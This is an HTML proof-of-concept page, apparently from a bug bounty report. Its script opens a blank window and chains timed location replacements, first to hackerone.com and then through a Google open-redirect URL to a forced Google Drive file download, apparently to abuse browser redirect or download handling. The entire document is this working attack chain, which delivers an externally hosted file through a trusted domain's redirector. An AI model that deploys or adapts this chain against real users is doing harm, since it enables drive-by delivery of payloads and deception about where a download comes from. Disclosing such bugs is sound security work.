<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>poc</title>
  <script>
    function chainRedirect(w, urls, index = 0) {
      if (index < urls.length) {
        w.location.replace(urls[index]);
        setTimeout(() => chainRedirect(w, urls, index + 1), 1000);
      }
    }

    function startRedirect() {
      let w = window.open("");
      setTimeout(() => {
        chainRedirect(w, [
        "https://hackerone.com",
        "https://www.google.com/url?q=https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=c0a9d415-1a26-40f4-aa23-d51ca3b3b3ff&at=AGN2oQ0ghVf6FdtYpzCBjaGhXUYa:1773898386994",
        "https://www.google.com/url?q=https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=c0a9d415-1a26-40f4-aa23-d51ca3b3b3ff&at=AGN2oQ0ghVf6FdtYpzCBjaGhXUYa:1773898386994",
        ]);
      }, 1000);
    }
  </script>
</head>
<body>
  <button onclick="startRedirect()">Start</button>
</body>
</html>
